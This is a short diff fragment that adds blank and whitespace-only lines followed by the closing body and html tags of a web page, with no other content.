+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
